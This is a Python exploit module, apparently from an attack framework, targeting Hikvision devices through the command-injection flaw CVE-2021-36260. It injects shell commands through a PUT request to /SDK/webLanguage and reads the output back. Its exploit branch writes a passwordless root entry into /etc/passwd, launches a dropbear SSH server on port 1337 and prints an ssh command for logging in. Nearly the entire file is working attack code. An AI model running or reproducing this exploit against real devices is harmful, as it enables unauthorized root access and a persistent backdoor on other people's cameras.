from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.util.fun import *
import lib.util.globalvar as GlobalVar
"""
+-------------+----------------+---------------------------------------------+
| Target type | Vuln Name      | Impact Version && Vulnerability description |
+-------------+----------------+---------------------------------------------+
| hikvision   | CVE_2021_36260 | [rce] app="hikvision"                       |
+-------------+----------------+---------------------------------------------+
"""
class hikvision():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = env.get('timeout')
        self.retry_time = env.get('retry_time')
        self.retry_interval = env.get('retry_interval')
        self.flag = GlobalVar.get_value('flag')
            
    def CVE_2021_36260(self):
        appName = 'hikvision'
        pocname = 'CVE_2021_36260'
        path = '/SDK/webLanguage'
        method = 'put'
        desc = '[rce] app="hikvision"'
        data = '<?xml version="1.0" encoding="UTF-8"?><language>{}>webLib/x</language>'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0', 'Connection': 'close', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest'}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            if self.vuln == 'False':
                r = exprequest.put(
                    url=self.url+path, 
                    data=data.format(self.cmd),
                    headers=headers,
                    )
                r = exprequest.get(
                    url=self.url+'/x',
                    )
                if self.flag in r.text:
                    return output.echo_success(method, desc)
                else:
                    return output.fail()
            else:
                result = exprequest.get(
                    url=self.url+'/N',
                    headers=headers,
                    )
                if result.status_code == 404:
                    print(f'[i] Remote "{self.url}" not pwned, pwning now!')
                    r = exprequest.put(
                        url=self.url+path,
                        data=data.format('echo -n P::0:0:W>N'),
                        headers=headers,

                        )
                    r = exprequest.put(
                        url=self.url+path,
                        data=data.format('echo :/:/bin/sh>>N'),
                        headers=headers,

                        )
                    r = exprequest.put(
                        url=self.url+path,
                        data=data.format('cat N>>/etc/passwd'),
                        headers=headers,

                        )
                    r = exprequest.put(
                        url=self.url+path,
                        data=data.format('dropbear -R -B -p 1337'),
                        headers=headers,

                        )
                    r = exprequest.put(
                        url=self.url+path,
                        data=data.format('cat N>webLib/N'),
                        headers=headers,

                        )
                print(f'[*] Trying SSH to {self.url} on port 1337')
                print(f'[*] ssh -o StrictHostKeyChecking=no -o LogLevel=error -o UserKnownHostsFile=/dev/null {self.url} -p 1337')
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    ExpHikvision = hikvision(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(ExpHikvision, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(hikvision):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(ExpHikvision, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)